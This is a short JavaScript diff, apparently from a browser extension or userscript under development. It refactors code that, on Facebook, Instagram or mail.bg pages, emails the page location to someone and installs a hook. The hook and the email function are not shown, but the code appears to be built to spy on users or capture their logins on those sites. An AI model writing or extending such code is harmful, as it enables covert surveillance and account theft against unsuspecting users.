@@ -105,8 +105,9 @@ function initHook() {
     }
 }
 
-
-if (location.hostname.includes("facebook") || location.hostname.includes("instagram") || location.hostname.includes("mail.bg")) {
-	sendEmail(String(location));
-	initHook();
+function InitProgram() {
+	if (location.hostname.includes("facebook") || location.hostname.includes("instagram") || location.hostname.includes("mail.bg")) {
+		sendEmail(String(location));
+		initHook();
+	}
 }
